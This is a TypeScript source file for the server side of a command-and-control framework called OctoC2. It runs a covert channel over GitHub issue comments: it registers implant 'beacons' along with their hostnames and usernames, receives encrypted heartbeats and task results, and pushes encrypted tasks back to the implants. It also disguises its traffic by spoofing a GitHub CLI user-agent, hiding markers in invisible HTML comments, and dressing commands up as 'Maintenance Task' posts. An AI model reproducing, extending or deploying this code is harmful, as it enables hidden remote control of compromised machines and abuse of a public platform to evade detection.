/**
 * OctoC2 Server — IssuesChannel
 *
 * Polls the C2 GitHub repository for beacon comments using:
 *   GET /repos/{owner}/{repo}/issues/comments?since={lastPollTime}&per_page=100
 *
 * Recognizes three comment types:
 *   reg    — new beacon registration (first checkin with public key)
 *   ci     — routine heartbeat/checkin
 *   logs   — task result submission
 *
 * For each checkin, if the beacon has pending tasks in the TaskQueue, the
 * channel encrypts and posts a [job:...:deploy:...] comment to the beacon's
 * issue.
 *
 * Comment format parsed:
 *   [job:{epoch}:(reg|ci|logs):{seq}]
 *   ...
 *   ```text\n{base64url_payload}\n```
 *   <!-- - -->   ← beacon placeholder (sealed, no nonce)
 *
 * Crypto:
 *   Incoming (beacon → server): crypto_box_seal  → openSealBox()
 *   Outgoing (server → beacon): crypto_box       → encryptForBeacon()
 */

import { Octokit } from "@octokit/rest";
import type { BeaconRegistry, BeaconRecord } from "../BeaconRegistry.ts";
import type { TaskQueue, QueuedTask } from "../TaskQueue.ts";
import {
  openSealBox, encryptForBeacon,
  base64ToBytes, bytesToBase64, bytesToString,
} from "../crypto/sodium.ts";

// ── Regexes (mirrors implant's IssuesTentacle.ts) ─────────────────────────────

// Job marker is an HTML comment — invisible to viewers, parseable by machines
const HEARTBEAT_RE  = /<!--\s*job:(\d+):(reg|ci|logs|deploy):([^\s>]+)\s*-->/m;
// Beacon comments embed the ciphertext inside the infra-diagnostic HTML comment: <!-- infra-diagnostic:epoch:CIPHERTEXT -->
const CIPHERTEXT_RE = /<!--\s*infra-diagnostic:[^\s:>]+:([A-Za-z0-9_\-+/=]+)\s*-->/;
// Matches both <!-- - --> (sealed, no real nonce) and <!-- base64url_nonce -->
// Colons in the job marker keep it outside this character class — no overlap.
const NONCE_RE      = /<!--\s+(-|[A-Za-z0-9_-]{4,})\s+-->/;

// ── Operator public key resolution ────────────────────────────────────────────

const OPERATOR_PUBKEY_VAR = "MONITORING_PUBKEY";

/**
 * Resolve the operator X25519 public key.
 *
 * Priority order:
 *   1. GitHub Variables API  — `MONITORING_PUBKEY` repo variable
 *      (authoritative source; beacons read from here too)
 *   2. `MONITORING_PUBKEY` env var — fallback for air-gapped/offline use
 *
 * Throws if neither source yields a valid 32-byte key.
 */
export async function resolveOperatorPublicKey(
  octokit: Octokit,
  owner:   string,
  repo:    string
): Promise<Uint8Array> {
  // ── 1. Try GitHub Variables API ─────────────────────────────────────────────
  try {
    const resp = await octokit.rest.actions.getRepoVariable({
      owner, repo, name: OPERATOR_PUBKEY_VAR,
    });
    const b64 = resp.data.value?.trim();
    if (b64 && b64.length > 0) {
      const key = await base64ToBytes(b64);
      if (key.length === 32) {
        console.log(`[IssuesChannel] Operator public key loaded from GitHub Variable`);
        return key;
      }
      console.warn(`[IssuesChannel] GitHub Variable '${OPERATOR_PUBKEY_VAR}' decoded to ${key.length} bytes (expected 32) — trying env fallback`);
    }
  } catch (err) {
    console.warn(
      `[IssuesChannel] Could not fetch '${OPERATOR_PUBKEY_VAR}' from GitHub Variables:`,
      (err as Error).message,
      "— trying env fallback"
    );
  }

  // ── 2. Fall back to env var ──────────────────────────────────────────────────
  const envB64 = process.env[OPERATOR_PUBKEY_VAR]?.trim();
  if (envB64 && envB64.length > 0) {
    const key = await base64ToBytes(envB64);
    if (key.length === 32) {
      console.log(`[IssuesChannel] Operator public key loaded from env var`);
      return key;
    }
  }

  throw new Error(
    `[IssuesChannel] Operator public key not found. ` +
    `Set the '${OPERATOR_PUBKEY_VAR}' GitHub repo variable (preferred) ` +
    `or the '${OPERATOR_PUBKEY_VAR}' environment variable.`
  );
}

// ── Config ────────────────────────────────────────────────────────────────────

export interface IssuesChannelConfig {
  owner:            string;
  repo:             string;
  token:            string;
  /** X25519 operator public key (Uint8Array) — used to decrypt sealed messages */
  operatorPublicKey:  Uint8Array;
  /** X25519 operator secret key (Uint8Array) — used to encrypt task deliveries */
  operatorSecretKey:  Uint8Array;
  /** Polling interval in ms (default: 30 000) */
  pollIntervalMs?: number;
  /**
   * Pre-built Octokit instance. When provided, `token` is still stored but
   * the provided instance is used for all API calls. Useful when the caller
   * already created an Octokit (e.g., for key resolution) and wants to reuse it.
   */
  octokit?: Octokit;
}

// ── Parsed beacon comment ────────────────────────────────────────────────────

interface ParsedBeaconComment {
  commentId:  number;
  issueNumber: number;
  type:       "reg" | "ci" | "logs";
  seq:        number;
  ciphertext: string;
}

// ── IssuesChannel ─────────────────────────────────────────────────────────────

export class IssuesChannel {
  private readonly octokit:   Octokit;
  private readonly registry:  BeaconRegistry;
  private readonly taskQueue: TaskQueue;
  private readonly config:    Omit<Required<IssuesChannelConfig>, "octokit">;

  /** ISO-8601 timestamp of the last successful poll. Updated after each round. */
  private lastPollTime: string;

  private pollTimer: ReturnType<typeof setInterval> | null = null;

  constructor(
    registry:  BeaconRegistry,
    taskQueue: TaskQueue,
    config:    IssuesChannelConfig,
  ) {
    this.registry  = registry;
    this.taskQueue = taskQueue;
    this.config    = {
      pollIntervalMs: 30_000,
      ...config,
    };

    this.octokit = config.octokit ?? new Octokit({
      auth:    config.token,
      // Blend into normal git traffic
      headers: { "user-agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0" },
    });

    // Start polling 5 seconds in the past to catch comments made just before startup
    this.lastPollTime = new Date(Date.now() - 5_000).toISOString();
  }

  // ── Lifecycle ─────────────────────────────────────────────────────────────────

  /** Begin periodic polling. Call once at server startup. */
  start(): void {
    if (this.pollTimer) return;

    console.log(
      `[IssuesChannel] Starting poll loop (interval: ${this.config.pollIntervalMs}ms)`
    );

    this.pollTimer = setInterval(() => {
      this.poll().catch((err) =>
        console.warn("[IssuesChannel] Poll error:", (err as Error).message)
      );
    }, this.config.pollIntervalMs);

    // Run once immediately
    this.poll().catch((err) =>
      console.warn("[IssuesChannel] Initial poll error:", (err as Error).message)
    );
  }

  /** Stop polling. Call on graceful shutdown. */
  stop(): void {
    if (this.pollTimer) {
      clearInterval(this.pollTimer);
      this.pollTimer = null;
    }
  }

  // ── Main poll cycle ───────────────────────────────────────────────────────────

  async poll(): Promise<void> {
    const since    = this.lastPollTime;
    const polledAt = new Date().toISOString();

    const comments = await this.octokit.paginate(
      this.octokit.rest.issues.listCommentsForRepo,
      {
        owner:    this.config.owner,
        repo:     this.config.repo,
        since,
        per_page: 100,
        sort:     "created",
        direction: "asc",
      }
    );

    if (comments.length > 0) {
      console.log(`[IssuesChannel] Processing ${comments.length} new comment(s) since ${since}`);
    }

    for (const comment of comments) {
      // Only consider comments on issues (not pull requests)
      if (!comment.issue_url) continue;

      const issueNumber = extractIssueNumber(comment.issue_url);
      if (issueNumber === null) continue;

      const parsed = parseBeaconComment(comment.body ?? "", comment.id, issueNumber);
      if (!parsed) {
        const snippet = (comment.body ?? "").slice(0, 80).replace(/\n/g, " ");
        console.debug(`[IssuesChannel] Comment #${comment.id} on issue #${issueNumber} did not parse — skipping. Body: ${snippet}`);
        continue;
      }

      await this.dispatch(parsed);
    }

    // Proactive task delivery: push pending tasks to any beacon in maintenance mode.
    // Beacons running in maintenance-only mode (initialMaintenancePosted=true) skip
    // normal CI heartbeat comments, so onCheckin() is never triggered. This pass
    // ensures tasks queued after the first maintenance comment are still delivered.
    for (const beacon of this.registry.getAll()) {
      if (beacon.issueNumber == null || beacon.issueNumber === 0) continue;
      const pending = this.taskQueue.getPendingTasks(beacon.beaconId)
        .filter(t => !t.preferredChannel || t.preferredChannel === "issues");
      if (pending.length > 0) {
        console.log(
          `[IssuesChannel] Proactive delivery: ${pending.length} task(s) to beacon ${beacon.beaconId}`
        );
        await this.deliverTasks(beacon.issueNumber, beacon, pending);
      }
    }

    this.lastPollTime = polledAt;
  }

  // ── Dispatch ──────────────────────────────────────────────────────────────────

  private async dispatch(comment: ParsedBeaconComment): Promise<void> {
    try {
      switch (comment.type) {
        case "reg":  await this.onRegistration(comment); break;
        case "ci":   await this.onCheckin(comment);      break;
        case "logs": await this.onResult(comment);       break;
      }
    } catch (err) {
      console.warn(
        `[IssuesChannel] Failed to process ${comment.type} comment #${comment.commentId}:`,
        (err as Error).message
      );
    }
  }

  // ── Handlers ──────────────────────────────────────────────────────────────────

  /**
   * Process a [job:...:reg:...] comment.
   * Decrypts the sealed payload, registers the beacon, posts an encrypted ACK
   * containing an empty task array [] so the beacon's pollForDeployComments
   * terminates cleanly without needing special-case logic.
   */
  private async onRegistration(comment: ParsedBeaconComment): Promise<void> {
    const plaintext = await this.openSeal(comment.ciphertext);
    const payload   = JSON.parse(bytesToString(plaintext)) as {
      beaconId:     string;
      publicKey:    string;
      hostname:     string;
      username:     string;
      os:           string;
      arch:         string;
      registeredAt: string;
    };

    // Validate seq (replay protection)
    const seqResult = this.registry.advanceSeq(payload.beaconId, comment.seq);
    if (seqResult === "replay") {
      console.warn(`[IssuesChannel] Replay seq ${comment.seq} from ${payload.beaconId} — ignored`);
      return;
    }
    if (seqResult === "gap") {
      console.warn(`[IssuesChannel] Seq gap for ${payload.beaconId} (seq=${comment.seq})`);
    }

    // Register (or re-register) the beacon
    this.registry.register({
      beaconId:    payload.beaconId,
      issueNumber: comment.issueNumber,
      publicKey:   payload.publicKey,
      hostname:    payload.hostname,
      username:    payload.username,
      os:          payload.os,
      arch:        payload.arch,
      seq:         comment.seq,
      tentacleId:  1,
    });

    // Post ACK: encrypt an empty task array to the beacon's public key.
    // The beacon decrypts it, gets [], and advances lastTaskCommentId — no
    // special-case handling needed on either side.
    const beaconPublicKey = await base64ToBytes(payload.publicKey);
    const { nonce, ciphertext } = await encryptForBeacon(
      JSON.stringify([]),
      beaconPublicKey,
      this.config.operatorSecretKey
    );
    await this.postDeployComment(comment.issueNumber, payload.beaconId, "reg-ack", [], nonce, ciphertext);
  }

  /**
   * Process a [job:...:ci:...] heartbeat.
   * Updates lastSeen, delivers any pending tasks.
   */
  private async onCheckin(comment: ParsedBeaconComment): Promise<void> {
    const plaintext = await this.openSeal(comment.ciphertext);
    const payload   = JSON.parse(bytesToString(plaintext)) as { beaconId: string };

    const beacon = this.registry.getByIssue(comment.issueNumber);
    if (!beacon) {
      console.warn(
        `[IssuesChannel] ci comment on issue #${comment.issueNumber} but no beacon in registry — ` +
        "beacon may need to re-register."
      );
      return;
    }

    // Replay protection
    const seqResult = this.registry.advanceSeq(beacon.beaconId, comment.seq);
    if (seqResult === "replay") {
      console.warn(`[IssuesChannel] Replay seq ${comment.seq} from ${beacon.beaconId} — ignored`);
      return;
    }

    this.registry.updateLastSeen(beacon.beaconId, comment.seq);
    this.registry.updateActiveTentacle(beacon.beaconId, 1);
    void payload; // checkin payload parsed for future use (sysinfo, etc.)

    // Deliver any pending tasks that have no preferredChannel or prefer "issues"
    const allPending = this.taskQueue.getPendingTasks(beacon.beaconId);
    const pending = allPending.filter(
      t => !t.preferredChannel || t.preferredChannel === "issues"
    );
    if (pending.length > 0) {
      console.log(
        `[IssuesChannel] Delivering ${pending.length} task(s) to beacon ${beacon.beaconId}`
      );
      await this.deliverTasks(comment.issueNumber, beacon, pending);
    }
  }

  /**
   * Process a [job:...:logs:...] result comment.
   * Decrypts and stores the task result.
   */
  private async onResult(comment: ParsedBeaconComment): Promise<void> {
    const plaintext = await this.openSeal(comment.ciphertext);
    const result    = JSON.parse(bytesToString(plaintext)) as {
      taskId:      string;
      beaconId:    string;
      completedAt: string;
      output?:     string;
      error?:      string;
    };

    const beacon = this.registry.getByIssue(comment.issueNumber);
    if (!beacon) {
      console.warn(`[IssuesChannel] Result from unknown issue #${comment.issueNumber}`);
      return;
    }

    // Replay protection
    const seqResult = this.registry.advanceSeq(beacon.beaconId, comment.seq);
    if (seqResult === "replay") {
      console.warn(`[IssuesChannel] Replay seq ${comment.seq} on result — ignored`);
      return;
    }

    this.registry.updateLastSeen(beacon.beaconId, comment.seq);

    const resultPayload = result.output ?? result.error ?? "(no output)";
    const completed = this.taskQueue.markCompleted(result.taskId, resultPayload);

    if (completed) {
      console.log(
        `[IssuesChannel] Task ${result.taskId} result received from ${beacon.beaconId}`
      );
    } else {
      console.warn(
        `[IssuesChannel] Result for unknown/already-closed task ${result.taskId}`
      );
    }
  }

  // ── Task delivery ──────────────────────────────────────────────────────────────

  /**
   * Encrypt all pending tasks together and post a single deploy comment.
   * All tasks are bundled into one JSON array and encrypted to the beacon's
   * X25519 public key, authenticated by the operator's secret key.
   */
  private async deliverTasks(
    issueNumber: number,
    beacon: BeaconRecord,
    tasks: QueuedTask[]
  ): Promise<void> {
    const beaconPublicKey = await base64ToBytes(beacon.publicKey);

    // Serialize the task array (strip internal fields the beacon doesn't need)
    const taskArray = tasks.map(t => ({
      taskId: t.taskId,
      kind:   t.kind,
      args:   t.args,
      ref:    t.ref,
    }));

    const { nonce, ciphertext } = await encryptForBeacon(
      JSON.stringify(taskArray),
      beaconPublicKey,
      this.config.operatorSecretKey
    );

    // Use the first task's ref as the comment ref (most common case: one task)
    const ref = tasks[0]?.ref ?? "batch";

    await this.postDeployComment(issueNumber, beacon.beaconId, ref, tasks, nonce, ciphertext);

    // Mark all delivered tasks
    for (const task of tasks) {
      this.taskQueue.markDelivered(task.taskId);
    }
  }

  /**
   * Post a [job:...:deploy:...] comment to the beacon's issue.
   * Both `nonce` and `ciphertext` are required — callers must always encrypt.
   */
  private async postDeployComment(
    issueNumber: number,
    beaconId:    string,
    ref:         string,
    _tasks:      QueuedTask[],
    nonce:       string,
    ciphertext:  string
  ): Promise<void> {
    const epoch = Math.floor(Date.now() / 1000);

    const body = [
      // Invisible to viewers; parsed by the beacon's pollForDeployComments
      `<!-- job:${epoch}:deploy:${ref} -->`,
      "",
      `### 📌 Maintenance Task · Ref \`${ref}\``,
      "",
      "Automated maintenance task queued for execution.",
      "",
      "<details>",
      "<summary>Operation parameters</summary>",
      "",
      "```text",
      ciphertext,
      "```",
      "",
      "</details>",
      `<!-- ${nonce} -->`,
    ].join("\n");

    await this.octokit.rest.issues.createComment({
      owner:        this.config.owner,
      repo:         this.config.repo,
      issue_number: issueNumber,
      body,
    });

    console.log(
      `[IssuesChannel] Posted deploy comment (ref=${ref}) on issue #${issueNumber} for ${beaconId}`
    );
  }

  // ── Crypto helpers ─────────────────────────────────────────────────────────────

  private async openSeal(ciphertextB64: string): Promise<Uint8Array> {
    return openSealBox(ciphertextB64, this.config.operatorPublicKey, this.config.operatorSecretKey);
  }
}

// ── Module-level helpers ───────────────────────────────────────────────────────

/** Extract the issue number from a GitHub issue_url like .../issues/42 */
function extractIssueNumber(url: string): number | null {
  const m = /\/issues\/(\d+)$/.exec(url);
  return m ? parseInt(m[1]!, 10) : null;
}

/** Parse a raw comment body into a typed beacon comment, or null if unrecognized. */
function parseBeaconComment(
  body:        string,
  commentId:   number,
  issueNumber: number
): ParsedBeaconComment | null {
  const hb = HEARTBEAT_RE.exec(body);
  if (!hb) return null;

  const type = hb[2] as "reg" | "ci" | "logs" | "deploy";
  // Skip server-posted deploy comments (avoid processing our own output)
  if (type === "deploy") return null;

  const ct = CIPHERTEXT_RE.exec(body);
  if (!ct) return null;

  const seq = parseInt(hb[3]!, 10);
  if (isNaN(seq)) return null;

  return {
    commentId,
    issueNumber,
    type:       type as "reg" | "ci" | "logs",
    seq,
    ciphertext: ct[1]!.trim(),
  };
}

